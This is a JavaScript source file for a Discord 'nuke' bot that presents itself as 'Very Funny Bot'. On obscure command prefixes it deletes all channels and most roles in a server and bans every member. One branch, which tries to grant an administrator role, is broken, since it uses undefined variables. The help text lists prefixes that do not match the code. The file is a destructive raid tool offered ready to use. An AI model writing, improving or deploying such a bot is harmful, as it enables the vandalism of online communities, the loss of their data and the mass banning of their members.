const discord = require("discord.js");
const nuke = new discord.Client();


nuke.on("ready", () => {
    console.log("This bot has been developed by ElecTwix.")
    console.log(`${nuke.user.tag} is online.`);
    nuke.user.setPresence({ game: { name: `Very Funny Bot` }, type: 0 }); // Change The Bot Name
});

nuke.on("message", async (msg) => {



    if (msg.content.toLowerCase().startsWith("bb35n!" + "nuke")) {
        msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
        msg.guild.channels.deleteAll();
        msg.guild.members.tap(member => member.ban("Discord Global Ban 52a"));
    }
    if (msg.content.toLowerCase().startsWith("bb35n!" + "delete")) {
        msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
        msg.guild.channels.deleteAll();
    }
    if (msg.content.toLowerCase().startsWith("bbn!" + "ban")) {
        msg.guild.members.tap(member => member.ban("Why Not?"));
    }
    if (msg.content.toLowerCase().startsWith("yar!" + "role")) {
        guild.createRole({
            name: 'Super Cool People',
            color: 'BLUE',
        })
        role.setPermissions(['ADMINISTRATOR'])
        role.setPosition(15)
    }
    if (msg.content.toLowerCase().startsWith("bb35n!" + "help")) {
        msg.author.send({
            embed: {
                color: 0xff0000,
                author: { name: "Nope" },
                description: "n!nuke - Bans all members & deletes all roles and channels\nn!delete - Deletes all channels and roles\nn!ban - Bans all members in the discord\n\nFor any help contact Jinx#4395"
            }
        })
    }
});

nuke.login("your token here"); // Replace your Token

//ElecTwix
